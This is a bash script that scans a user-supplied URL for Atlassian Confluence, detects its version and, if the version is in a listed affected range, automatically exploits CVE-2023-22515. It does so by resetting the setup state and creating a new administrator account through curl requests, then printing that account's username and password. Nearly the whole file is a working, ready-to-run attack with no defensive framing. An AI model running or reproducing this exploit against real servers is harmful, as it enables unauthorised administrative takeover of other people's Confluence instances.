#!/bin/bash

full_version_of_atlassian_confluence=(8.6.0 8.5.2 8.5.1 8.5.0 8.4.3 8.4.2 8.4.1 8.4.0 8.3.3 8.3.2 8.3.1 8.3.0 8.2.3 8.2.2 8.2.1 8.2.0 8.1.4 8.1.3 8.1.1 8.1.0 8.0.4 8.0.3 8.0.2 8.0.1 8.0.0 7.20.3 7.20.2 7.20.1 7.20.0 7.19.15 7.19.14 7.19.12 7.19.11 7.19.10 7.19.9 7.19.8 7.19.7 7.19.6 7.19.5 7.19.4 7.19.3 7.19.2 7.19.1 7.19.0 7.18.3 7.18.2 7.18.1 7.18.0 7.7.5 7.17.4 7.17.3 7.17.2 7.17.1 7.17.0 7.16.5 7.16.4 7.16.3 7.16.2 7.16.1 7.16.0 7.15.3 7.15.2 7.15.1 7.15.0 7.14.4 7.14.3 7.14.2 7.14.1 7.14.0 7.13.20 7.13.19 7.13.18 7.13.17 7.13.16 7.13.15 7.13.14 7.13.13 7.13.12 7.13.11 7.13.9 7.13.8 7.13.7 7.13.6 7.13.5 7.13.4 7.13.3 7.13.2 7.13.1 7.13.0 7.12.5 7.12.4 7.12.3 7.12.2 7.12.1 7.12.0 7.11.6 7.11.3 7.11.2 7.11.1 7.11.0 7.10.2 7.10.1 7.10.0 7.9.3 7.9.1 7.9.0 7.8.3 7.8.1 7.8.0 7.7.4 7.7.3 7.7.2 7.6.3 7.6.2 7.6.1 7.6.0 7.5.2 7.5.1 7.5.0 7.4 7.4.18 7.4.17 7.4.16 7.4.15 7.4.14 7.4.13 7.4.12 7.4.11 7.4.10 7.4.9 7.4.8 7.4.7 7.4.6 7.4.5 7.4.4 7.4.3 7.4.1 7.4.0 7.3.5 7.3.4 7.3.3 7.3.2 7.3.1 7.2.2 7.2.1 7.2.0 7.1.2 7.1.1 7.1.0 7.0.5 7.0.4 7.0.3 7.0.2 7.0.1 6.15.10 6.15.9 6.15.8 6.15.7 6.15.6 6.15.4 6.15.2 6.15.1 6.14.3 6.14.2 6.14.1 6.14.0 6.13.23 6.13.21 6.13.20 6.13.19 6.13.18 6.13.17 6.13.15 6.13.13 6.13.12 6.13.11 6.13.10 6.13.9 6.13.8 6.13.7 6.13.6 6.13.5 6.13.4 6.13.3 6.13.2 6.13.1 6.13.0 6.12.4 6.12.3 6.12.2 6.12.1 6.12.0 6.12.2 6.12.1 6.12.0 6.10.3 6.10.2 6.10.1 6.10.0 6.9.3 6.9.1 6.9.0 6.8.5 6.8.3 6.8.2 6.8.1 6.8.0 6.7.3 6.7.2 6.7.1 6.7.0 6.6.17 6.6.16 6.6.15 6.6.14 6.6.13 6.6.12 6.6.12 6.6.10 6.6.9 6.6.8 6.6.7 6.6.6 66.5 66.4 6.6.3 6.6.2 6.6.1 6.6.0 6.5.3 6.5.2 6.5.1 6.5.0 6.4.3 6.4.2 6.4.1 6.4.0 6.3.4 6.3.3 6.3.2 6.3.1 6.2.4 6.2.3 6.2.2 6.2.1 6.2.0 6.1.4 6.1.3 6.1.2 6.1.1 6.1.0 6.0.7 6.0.6 6.0.5 6.0.4 6.0.3 6.0.2 6.0.1 5.10.9 5.10.8 5.10.7 5.10.6 5.10.4 5.10.3 5.10.2 5.10.1 5.10.0 5.9.14 5.9.12 5.9.11 5.9.10 5.9.9 5.9.8 5.9.7 5.9.6 5.9.5 5.9.4 5.9.3 5.9.2 5.9.1 5.9.1-beta11 5.8.18 5.8.17 5.8.16 5.8.15 5.8.14 5.8.13 5.8.10 5.8.9 5.8.8 5.8.6 5.8.5 5.8.4 5.8.25.7.6 5.7.5 5.7.4 5.7.3 5.7.1 5.7 5.6.6 5.6.5 5.6.4 5.6.3 5.6.1 5.5.7 5.5-OD-31-009 5.5.6 5.5.3 5.5.2 5.5.1 5.5 5.4.4 5.4.3 5.4.2 5.4.1 5.4 5.3.4 5.3.1 5.3 5.2.5 5.2.3 5.1.5 5.1.4 5.1.3 5.1.2 5.1.1 5.1 5.0.3 5.0.2 5.0.1 5.0 4.3.7 4.3.6 4.3.5 4.3.3 4.3.2 4.3.1 4.3 4.2.13 4.2.12 4.2.11 4.2.8 4.2.7 4.2.6 4.2.5 4.2.4 4.2.3 4.2.2 4.2.1 4.2 4.1.10 4.1.9 4.1.7 4.1.6 4.1.5 4.1.4 4.1.3 4.1.2 4.1 4.0.7 4.0.5 4.0.4 4.0.3 4.0 3.5.17 3.5.16 3.5.13 3.5.11 3.5.9 3.5.7 3.5.6 3.5.5 3.5.4 3.5.3 3.5.2 3.5.1 3.5 3.4.9 3.4.8 3.4.7 3.4.6 3.4.5 3.4.3 3.4.2 3.4.1 3.4 3.3.3 3.3.1 3.3 3.2.1_01 3.2 3.1.2 3.1.1 3.1 3.0.2 3.0.1 2.10.4 2.9.3 2.8.3 2.7.4 2.6.3 2.2.10 2.2.9 2.2.8 2.2.7 2.2.6a 2.2.5 2.2.4 2.2.3 2.2.2 2.2.1a 2.2.1 2.2 2.1.5a 2.1.5 2.1.4 2.1.3 2.1.2 2.1.1 2.1 2.0.3 2.0.2 2.0.1 2.0 1.4.4 1.4.3 1.4.2 1.4.1 1.4 1.3.6 1.3.5 1.2.3 1.1.2 1.0.3a) 
version_vul=(8.0.0 8.0.1 8.0.2 8.0.3 8.0.4 8.1.0 8.1.1 8.1.3 8.1.4 8.2.0 8.2.1 8.2.2 8.2.3 8.3.0 8.3.1 8.3.2 8.4.0 8.4.1 8.4.2 8.5.0 8.5.1)
red=$(echo -e '\033[01;31m')
green=$(echo -e '\033[01;32m')
yellow=$(echo -e '\033[01;33m')
blue=$(echo -e '\033[01;34m')
magenta=$(echo -e '\033[01;35m')
reset=$(echo -e '\033[00m')

function setup(){
    echo -e ${yellow}"[+] Checking ..."

    # check root 
    if [ "$EUID" -ne 0 ]; then
        echo -e "${red}\x09[-] Please run this script as root"
    exit 1
    fi

    # check lynx
    if command -v lynx > /dev/null; then
        echo -e "${magenta}\x09[+] Done setup ...${reset}"
    else
        sudo apt update
        sudo apt install -y lynx
        echo -e "${magenta}\x09[+] Done setup ...${reset}"
    fi
}

function findSubstring() {
    if [ $# -ne 2 ]; then
        return 1
    fi

    string=$(echo $1 | tr '[:upper:]' '[:lower:]')
    sub_string=$(echo $2 | tr '[:upper:]' '[:lower:]')

    if [[ "$string" =~ "$sub_string" ]]; then
        return 0
    else
        return 1
    fi
}

function exploit_CVE202322515(){
    URL="$1"
    
    username=$(tr -dc 'a-z0-9' < /dev/urandom | head -c 10)
    data="username=$username&fullName=$username&email=$username%40gmail.com&password=$username&confirm=$username&setup-next-button=Next"
    a=$(curl -s "$URL/server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false") 
    a=$(curl -s -X POST -H "X-Atlassian-Token: no-check" --data-raw $data $URL/setup/setupadministrator.action) 
    a=$(curl -s -X POST -H "X-Atlassian-Token: no-check" $URL/setup/finishsetup.action) 

    echo -e "\x09\x09\x09${magenta}[+] === [Done] ==="
    echo -e "\x09\x09\x09\x09${blue}[${green}INFO${blue}] Username: ${green}$username"
    echo -e "\x09\x09\x09\x09${blue}[${green}INFO${blue}] Password: ${green}$username"
}


function scan-exploit() {

    if [ $# -ne 1 ]; then
        return 1
    fi

    URL="$1"

    request=$(curl -s -I -L "$URL")
    body=$(curl -s "$URL")

    dump_by_lynx=1

    if which lynx > /dev/null; then
        dump_by_lynx=$(lynx -dump "$URL")
    fi

    # echo "$body"
    filter_body=$(echo "$body" | grep "Atlassian Confluence" )
    filter_ajs_version_number=$(echo "$body" | grep "ajs-version-number" )
    filter_footer_build_information=$(echo "$body" | grep "footer-build-information" )
    filter_print_only=$(echo "$body" | grep "print-only" )
    filter_whats_new_menu_link=$(echo "$body" | grep "whats-new-menu-link" )
    filter_confluence_help_link=$(echo "$body" | grep "confluence-help-link" )
    # echo "findSubstring '$filter_body' 'Atlassian Confluence 7.3.3'"

    flag=false
    version_web=0

    if findSubstring "$request" "x-confluence-request-time"; then
        echo -e "${green}[+] Server detected:"
        echo -e "\x09${blue}[+] Server is: Atlassian Confluence"
        echo -e "\x09${blue}[+] Checking version"
        for i in "${full_version_of_atlassian_confluence[@]}"; do

            if findSubstring "$filter_body" "Atlassian Confluence $i"; then
                flag=true
                echo -e "\x09\x09${green}[+] Version detected"
                echo -e "\x09\x09\x09${red}[+] Version of Atlassian Confluence is $i"
                version_web=$i
                break
            
            elif findSubstring "$filter_ajs_version_number" "$i"; then
                flag=true
                echo -e "\x09\x09${green}[+] Version detected"
                echo -e "\x09\x09\x09${red}[+] Version of Atlassian Confluence is $i"
                version_web=$i
                break
            
            elif findSubstring "$filter_footer_build_information" "$i"; then
                flag=true
                echo -e "\x09\x09${green}[+] Version detected"
                echo -e "\x09\x09\x09${red}[+] Version of Atlassian Confluence is $i"
                version_web=$i
                break

            elif findSubstring "$filter_print_only" "$i"; then
                flag=true
                echo -e "\x09\x09${green}[+] Version detected"
                echo -e "\x09\x09\x09${red}[+] Version of Atlassian Confluence is $i"
                version_web=$i
                break

            # Block curl -s
            elif findSubstring "$dump_by_lynx" "Atlassian Confluence $i"; then
                flag=true
                echo -e "\x09\x09${green}[+] Version detected"
                echo -e "\x09\x09\x09${red}[+] Version of Atlassian Confluence is $i"
                version_web=$i
                break
                # else
                #     echo -e "${red}[-] Version not detected"
            fi  
        done

        flag_vul=false

        if [[ $flag == true ]]; then
            echo -e "\x09\x09${green}[+] Checking for CVE-2023-22515"
            
            for i in "${version_vul[@]}"; do
                if findSubstring "$version_web" "$i"; then
                    flag_vul=true
                    echo -e "\x09\x09\x09${yellow}[+] This version are affected by this vulnerability"
                fi
            done 

            if [[ $flag_vul == true ]]; then
                echo -e "\x09\x09\x09${blue}[+] Exploiting..."
                exploit_CVE202322515 "$URL"

            else
                echo -e "\x09\x09\x09${red}[-] This version are not affected by this vulnerability"
            fi
         
        # Version not detected 
        else    
            echo -e "\x09\x09${red}[-] Version not detected"
        fi
    fi
}


function main() {
    setup
    read -p "Enter URL (Ex: https://google.com): " URL
    echo "Website reconnaissance: $red$URL"
    echo ""
    scan-exploit "$URL"
}

main